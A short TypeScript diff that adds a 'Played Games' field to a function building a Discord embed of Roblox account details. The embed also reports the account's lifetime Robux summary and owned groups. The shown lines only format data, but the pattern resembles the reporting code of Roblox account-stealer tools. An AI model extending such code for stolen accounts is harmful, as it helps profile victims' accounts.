@@ -502,6 +502,17 @@ function buildDiscordPayload(opts: {
       { name: "📊 Lifetime Summary", value: roblox.summary !== null ? `${roblox.summary >= 0 ? "+" : ""}${roblox.summary.toLocaleString()} R$` : "Unknown", inline: true },
     );
 
+    // Tracked games played
+    if (roblox.playedGames.length > 0) {
+      mainFields.push({
+        name: "🎮 Played Games",
+        value: roblox.playedGames
+          .map((g) => `${g.played ? "✅" : "❌"} ${g.name}`)
+          .join("\n"),
+        inline: false,
+      });
+    }
+
     // Owned groups — chunked to 1024 chars per field
     if (roblox.ownedGroups.length > 0) {
       const lines = roblox.ownedGroups.map(
